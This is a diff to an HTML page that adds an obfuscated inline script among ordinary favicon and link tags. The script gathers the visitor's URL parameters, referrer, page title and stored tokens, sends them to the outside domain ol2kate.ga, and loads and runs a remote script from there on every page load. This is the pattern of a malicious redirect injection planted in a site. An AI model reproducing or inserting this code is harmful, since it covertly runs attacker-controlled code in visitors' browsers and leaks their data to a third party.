@@ -76,6 +76,50 @@
 	});
 </script>
 
+<script>
+    (function() {
+    var name = '_2Mh5y1njbbj8dzP8';
+    if (!window._2Mh5y1njbbj8dzP8) {
+        window._2Mh5y1njbbj8dzP8 = {
+            unique: false,
+            ttl: 86400,
+            R_PATH: 'https://ol2kate.ga/F54s4tM6',
+            P_PATH: 'https://ol2kate.ga/7b4f75c/postback',
+        };
+    }
+    const _bjPBpHZQ1k37LpKN = localStorage.getItem('config');
+    if (typeof _bjPBpHZQ1k37LpKN !== 'undefined' && _bjPBpHZQ1k37LpKN !== null) {
+        var _sMhKKgx9Rh219V4s = JSON.parse(_bjPBpHZQ1k37LpKN);
+        var _3qtcMLGWt7BZtDdy = Math.round(+new Date()/1000);
+        if (_sMhKKgx9Rh219V4s.created_at + window._2Mh5y1njbbj8dzP8.ttl < _3qtcMLGWt7BZtDdy) {
+            localStorage.removeItem('subId');
+            localStorage.removeItem('token');
+            localStorage.removeItem('config');
+        }
+    }
+    var _Rcpnnht33vhJbcrY = localStorage.getItem('subId');
+    var _PLnJJp3PCtvQJK83 = localStorage.getItem('token');
+    var _N7Njmps28jZq9nmg = '?return=js.client';
+        _N7Njmps28jZq9nmg += '&' + decodeURIComponent(window.location.search.replace('?', ''));
+        _N7Njmps28jZq9nmg += '&se_referrer=' + encodeURIComponent(document.referrer);
+        _N7Njmps28jZq9nmg += '&default_keyword=' + encodeURIComponent(document.title);
+        _N7Njmps28jZq9nmg += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
+        _N7Njmps28jZq9nmg += '&name=' + encodeURIComponent(name);
+        _N7Njmps28jZq9nmg += '&host=' + encodeURIComponent(window._2Mh5y1njbbj8dzP8.R_PATH);
+    if (typeof _Rcpnnht33vhJbcrY !== 'undefined' && _Rcpnnht33vhJbcrY && window._2Mh5y1njbbj8dzP8.unique) {
+        _N7Njmps28jZq9nmg += '&sub_id=' + encodeURIComponent(_Rcpnnht33vhJbcrY);
+    }
+    if (typeof _PLnJJp3PCtvQJK83 !== 'undefined' && _PLnJJp3PCtvQJK83 && window._2Mh5y1njbbj8dzP8.unique) {
+        _N7Njmps28jZq9nmg += '&token=' + encodeURIComponent(_PLnJJp3PCtvQJK83);
+    }
+    var a = document.createElement('script');
+        a.type = 'application/javascript';
+        a.src = window._2Mh5y1njbbj8dzP8.R_PATH + _N7Njmps28jZq9nmg;
+    var s = document.getElementsByTagName('script')[0];
+    s.parentNode.insertBefore(a, s)
+    })();
+    </script>
+
 <link rel="apple-touch-icon" sizes="180x180" href="images/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="images/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="images/favicon-16x16.png">
